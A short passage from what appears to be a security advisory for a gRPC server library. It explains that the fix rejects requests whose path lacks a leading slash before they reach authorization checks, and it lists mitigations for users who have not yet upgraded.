ensures that any request with a `:path` that does not start with a leading slash is immediately rejected with a `codes.Unimplemented` error, preventing it from reaching authorization interceptors or handlers with a non-canonical path string. While upgrading is the most secure and recommended path, users can mitigate the vulnerability using one of the following methods: Use a validating interceptor (recommended mitigation); infrastructure-level normalization; and/or policy hardening.
